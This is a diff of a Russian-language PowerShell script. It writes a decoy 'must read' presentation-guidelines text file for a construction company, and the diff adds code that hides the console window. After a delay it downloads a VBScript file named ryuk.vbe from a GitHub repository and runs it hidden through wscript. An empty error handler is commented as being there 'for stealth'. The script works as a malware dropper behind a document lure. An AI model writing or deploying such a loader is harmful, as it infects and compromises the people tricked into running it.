@@ -1,5 +1,18 @@
-# Создание текстового файла с руководством
-$filePath = Join-Path $env:LOCALAPPDATA "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
+# Скрываем окно PowerShell
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
+
+# Создаем текстовый файл
+$localAppData = [Environment]::GetFolderPath("LocalApplicationData")
+$filePath = Join-Path $localAppData "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
+
 $content = @"
 Данный документ регламентирует единые стандарты для создания всех презентаций компании «Капитал – Строитель жилья!» (kapital62.ru). Цель — обеспечить узнаваемость, профессиональный вид и целостность всех материалов.
 
@@ -38,11 +51,19 @@ $content = @"
 Дополните слайды визуальными материалами там, где сочтёте нужным — из папки “Медиа для презентаций” или с фотостоков, например Unsplash.com.
 "@
 
-# Создание директории и файла
-New-Item -Path $filePath -ItemType File -Force | Out-Null
 Set-Content -Path $filePath -Value $content -Encoding UTF8
 
-# Ожидание и загрузка файла
+# Ждем 45 секунд
 Start-Sleep -Seconds 45
-$downloadPath = Join-Path $env:LOCALAPPDATA "ryuk.vbe"
-Invoke-WebRequest -Uri "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe" -OutFile $downloadPath -UseBasicParsing
+
+# Скачиваем и запускаем файл
+$downloadPath = Join-Path $localAppData "ryuk.vbe"
+try {
+    Invoke-WebRequest -Uri "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe" -OutFile $downloadPath
+    if (Test-Path $downloadPath) {
+        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$downloadPath`"" -WindowStyle Hidden
+    }
+}
+catch {
+    # Обработка ошибок (оставляем пустой для скрытности)
+}
